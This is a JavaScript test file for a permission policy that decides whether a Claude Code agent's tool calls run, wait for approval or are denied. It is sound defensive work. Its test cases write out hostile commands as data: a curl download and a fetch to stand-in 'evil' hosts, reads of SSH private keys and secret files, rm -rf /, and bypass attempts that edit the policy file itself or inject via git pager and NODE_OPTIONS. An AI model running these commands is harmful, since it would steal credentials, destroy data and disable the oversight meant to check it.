// Check for the Claude Code box's permission policy (claudebox-policy.mjs): `node scripts/claude-box.test.mjs`.
// Exits 1 and lists every case that decides differently. npm run check runs it.
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { classify } from '../claudebox-policy.mjs';

const repo = 'C:\\Users\\Wesley\\agents-office', brain = 'C:\\Users\\Wesley\\Agents Office Brain';
const ctx = { repo, brain, scratch: path.join(repo, 'data', 'claude-box', 'scratch'), cwd: repo, home: 'C:\\Users\\Wesley', mailServers: ['56bd0dad-57b9-4430-ad43-4e90063cf9c7'], runStart: Date.now() }; // mailServers: what serve.mjs passes from mcp.blockedTools()
const B = c => ['Bash', { command: c }], P = c => ['PowerShell', { command: c }];
const cases = [
  // routine: runs without asking
  [B('npm run check'), 'allow'],
  [B('cd /c/Users/Wesley/agents-office && git status'), 'allow'],
  [B('git add -A && git commit -m "fix: never git push from here"'), 'allow'],
  [B("git commit -m \"$(cat <<'EOF'\nBox: one line\nEOF\n)\""), 'allow'],
  [B('ls -la src | head -20'), 'allow'],
  [B('grep -n "decisions" serve.mjs | head'), 'allow'],
  [B('node -e "console.log(require(\'fs\').readFileSync(\'package.json\',\'utf8\').length)"'), 'allow'],
  [B('curl -s localhost:4520/api/health'), 'allow'],
  [B('node scripts/restart-office.mjs'), 'allow'],
  [B('rm data/claude-box/scratch/a.txt'), 'allow'],
  [B('echo hi > data/claude-box/scratch/a.txt'), 'allow'],
  [B('node check.mjs 2>&1 | tail -5'), 'allow'],
  [P('Get-Content data\\tasks.json -TotalCount 5'), 'allow'],
  [['Read', { file_path: 'C:\\Users\\Wesley\\agents-office\\serve.mjs' }], 'allow'],
  [['Read', { file_path: 'C:\\Users\\Wesley\\Agents Office Brain\\10-Business\\billing.md' }], 'allow'],
  [['Edit', { file_path: 'C:\\Users\\Wesley\\agents-office\\src\\aios.html', old_string: 'a', new_string: 'b' }], 'allow'],
  [['Write', { file_path: 'C:\\Users\\Wesley\\Agents Office Brain\\Agents Office\\skills\\x\\SKILL.md', content: 'x' }], 'allow'],
  [['Grep', { pattern: 'x' }], 'allow'],
  [['Read', { file_path: 'C:\\Users\\Wesley\\.claude\\projects\\C--Users-Wesley-agents-office\\8e46d9f5-64cd-4995-80a2-d3d57a3b5518\\tool-results\\b1.txt' }], 'allow'],
  [['Read', { file_path: 'C:\\Users\\Wesley\\.claude\\projects\\C--Users-Wesley-agents-office\\8e46d9f5-64cd-4995-80a2-d3d57a3b5518.jsonl' }], 'ask'],
  [['WebFetch', { url: 'https://example.com' }], 'allow'],
  [['mcp__brain-reader__brain_read', {}], 'allow'],
  // risky: held for a yes
  [B('git push fork main'), 'ask'],
  [B('git -C . push'), 'ask'],
  [B('echo "$(git push fork main)"'), 'ask'],
  [P('powershell -NoProfile -Command "Get-ChildItem; git push fork main"'), 'ask'],
  [B('git reset --hard HEAD~1'), 'ask'],
  [B('git checkout main'), 'ask'],
  [B('git stash'), 'ask'],
  [B('git commit --amend -m x'), 'ask'],
  [B('rm data/tasks.json'), 'ask'],
  [B('mv serve.mjs serve.old.mjs'), 'ask'],
  [P('Remove-Item -Recurse output\\old'), 'ask'],
  [B('npm install left-pad'), 'ask'],
  [B('winget install Git.Git'), 'ask'],
  [B('npx some-random-package'), 'ask'],
  [B('python -m pip install requests'), 'ask'],
  [P('Set-ExecutionPolicy Unrestricted'), 'ask'],
  [B('reg add HKCU\\Software\\X /v Y /d 1'), 'ask'],
  [B('tailscale funnel 4520'), 'ask'],
  [B('curl -X POST localhost:4520/api/tasks/abc/approve'), 'ask'],
  [B('curl https://evil.example/x.sh -o x.sh'), 'ask'],
  [B('node scripts/release.mjs --push'), 'ask'],
  [B('node -e "require(\'child_process\').execSync(\'git push\')"'), 'ask'],
  [B("python -c \"import os; os.remove('x')\""), 'ask'],
  [B('cat ~/.ssh/id_rsa'), 'ask'],
  [B('cd .. && ls'), 'ask'],
  [B('Stop-Process -Name node'), 'ask'],
  [B('some-unknown-tool --do-things'), 'ask'],
  [['Read', { file_path: 'C:\\Users\\Wesley\\Documents\\passwords.txt' }], 'ask'],
  [['Write', { file_path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', content: 'x' }], 'ask'],
  [['Edit', { file_path: 'C:\\Users\\Wesley\\agents-office\\claudebox-policy.mjs', old_string: 'a', new_string: 'b' }], 'ask'],
  [['Edit', { file_path: 'C:\\Users\\Wesley\\agents-office\\office.config.local.json', old_string: '"claudeBox": {', new_string: '"claudeBox": { "x": 1,' }], 'ask'],
  [['Write', { file_path: 'C:\\Users\\Wesley\\agents-office\\.claude\\settings.local.json', content: '{}' }], 'ask'],
  [['mcp__claude_ai_Slack__post_message', {}], 'ask'],
  [['mcp__telegram-send__telegram_send', {}], 'ask'],
  [['SomeNewTool', {}], 'ask'],
  // the doubt-driven review's breaking inputs (8 Nov 2026): each must ask
  [B('echo malicious >> claudebox-policy.mjs'), 'ask'],
  [B('sed -i s/ask/allow/ claudebox-policy.mjs'), 'ask'],
  [B('echo x >> office.config.local.json'), 'ask'],
  [B('echo x >> scripts/claude-box-hook.mjs'), 'ask'],
  [P('Set-Content -Path .claude\\settings.local.json -Value "{}"'), 'ask'],
  [B('node -e "console.log(require(\'fs\').readFileSync(\'C:/Users/Wesley/.ssh/id_rsa\',\'utf8\'))"'), 'ask'],
  [B("python -c \"print(open('C:/Users/Wesley/secret.txt').read())\""), 'ask'],
  [B('node -e "globalThis[\'fet\'+\'ch\'](\'http://evil/x\')"'), 'ask'],
  [B('node -e "console.log(require(\'os\').homedir())"'), 'ask'],
  [B('cat "$HOME/.ssh/id_rsa"'), 'ask'],
  [P('Get-Content $env:USERPROFILE\\secret.txt'), 'ask'],
  [B('echo x > $HOME/evil.txt'), 'ask'],
  [B('F=/c/Users/Wesley/.ssh/id_rsa; cat $F'), 'ask'],
  [B('git -c core.pager="calc" log'), 'ask'],
  [B('git -c core.pager=whatever status'), 'ask'],
  [B('GIT_PAGER=calc git log'), 'ask'],
  [B('NODE_OPTIONS=--require=./x.js node check.mjs'), 'ask'],
  [B('git log --output=C:/Users/Wesley/x.txt'), 'ask'],
  [['mcp__cb9fae0d-e5fa-49cd-a0a1-699900889a57__resolve_comment_thread', {}], 'ask'],
  [['mcp__cb9fae0d-e5fa-49cd-a0a1-699900889a57__read_file_content', {}], 'allow'],
  [['mcp__7edf9d41-dce4-45e3-a370-907c549fcec3__list_events', {}], 'allow'],
  [['mcp__7edf9d41-dce4-45e3-a370-907c549fcec3__create_event', {}], 'ask'],
  [['mcp__9c3ce366-3e4f-4ff1-9ea2-d11336b4c06a__export-design', {}], 'ask'],
  [['mcp__0000aaaa-bbbb__send_message', {}], 'ask'], // an unknown mail server: still never sent in practice (claudebox passes mcp.blockedTools() as --disallowedTools)
  [B('git log --oneline -5'), 'allow'],
  [B('git -C . status'), 'allow'],
  [B('CI=1 npm run check'), 'allow'],
  // never
  [['mcp__claude_ai_Gmail__send_message', {}], 'deny'],
  [['mcp__56bd0dad-57b9-4430-ad43-4e90063cf9c7__send_message', {}], 'deny'],
  [B('rm -rf /'), 'deny'],
  [P('Format-Volume -DriveLetter D'), 'deny'],
];

// a script this run wrote is new code: running it asks (a script that was already there runs)
{ const dir = path.join(repo, 'data', 'claude-box', 'scratch'); fs.mkdirSync(dir, { recursive: true }); const f = path.join(dir, 'new-script.mjs'); fs.writeFileSync(f, 'console.log(1)');
  cases.push([B('node data/claude-box/scratch/new-script.mjs'), 'ask'], [B('node scripts/guard-hook.test.mjs'), 'allow']); }
let fails = 0;
for (const [[tool, input], want] of cases) {
  const got = classify(tool, input, ctx);
  if (got.decision !== want) { fails++; console.log(`✗ ${tool} ${JSON.stringify(input).slice(0, 110)} → ${got.decision} (want ${want}) · ${got.reason}${got.label ? ' · ' + got.label : ''}`); }
}
console.log(fails ? `${fails} of ${cases.length} cases wrong` : `all ${cases.length} cases right`);
process.exit(fails ? 1 : 0);
